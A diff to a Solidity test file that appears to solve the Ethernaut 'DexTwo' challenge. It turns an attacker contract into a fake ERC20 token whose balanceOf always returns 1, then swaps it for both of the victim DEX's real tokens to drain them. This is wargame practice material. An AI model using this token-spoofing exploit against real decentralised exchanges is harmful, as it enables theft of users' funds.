@@ -4,6 +4,7 @@ pragma solidity ^0.8.17;
 import "forge-std/Test.sol";
 import "../23-DexTwo.sol";
 import "@openzeppelin/contracts/utils/math/SafeMath.sol";
+import "openzeppelin-contracts/token/ERC20/IERC20.sol";
 
 contract DexTwoAttacker {
     DexTwo victim;
@@ -22,6 +23,10 @@ contract DexTwoAttacker {
         owner = msg.sender;
     }
 
+    function balanceOf(address account) public view returns (uint256) {
+        return 1;
+    }
+
     function transferFrom(
         address,
         address,
@@ -31,10 +36,7 @@ contract DexTwoAttacker {
     }
 
     function attack() external {
-        victim.swap(address(this), tokenInstance, 10);
-        victim.swap(address(this), tokenInstanceTwo, 10);
-
-        SwappableTokenTwo(tokenInstance).approve(address(this), owner, 10);
-        SwappableTokenTwo(tokenInstanceTwo).approve(address(this), owner, 10);
+        victim.swap(address(this), tokenInstance, 1);
+        victim.swap(address(this), tokenInstanceTwo, 1);
     }
 }
